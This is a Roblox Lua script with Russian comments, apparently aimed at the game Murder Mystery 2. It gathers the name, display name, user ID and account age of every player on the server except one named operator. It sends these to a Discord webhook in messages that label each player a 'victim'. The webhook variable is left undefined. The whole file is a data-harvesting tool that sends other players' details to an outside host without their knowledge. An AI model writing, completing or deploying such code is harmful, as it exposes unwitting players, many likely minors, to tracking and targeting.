local alphaNick = "Nersadme"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Простая функция отправки
local function sendToDiscord(msg, fields)
    local data = {
        content = msg,
        embeds = {{
            title = "Жертва в MM2",
            fields = fields or {}
        }}
    }
    
    local success, err = pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
    
    if not success then
        warn("Ошибка отправки: " .. tostring(err))
    end
end

-- Сбор инфы об игроке
local function stealInfo(player)
    local fields = {
        {name = "Ник", value = player.Name},
        {name = "DisplayName", value = player.DisplayName},
        {name = "UserID", value = tostring(player.UserId)},
        {name = "Возраст акка", value = tostring(player.AccountAge) .. " дней"}
    }
    
    sendToDiscord("Новая жертва на сервере, Alpha!", fields)
end

-- Проверяем всех игроков
for _, player in pairs(Players:GetPlayers()) do
    if player.Name ~= alphaNick then
        stealInfo(player)
    end
end

-- Новые игроки
Players.PlayerAdded:Connect(function(player)
    if player.Name ~= alphaNick then
        wait(1)
        stealInfo(player)
    end
end)

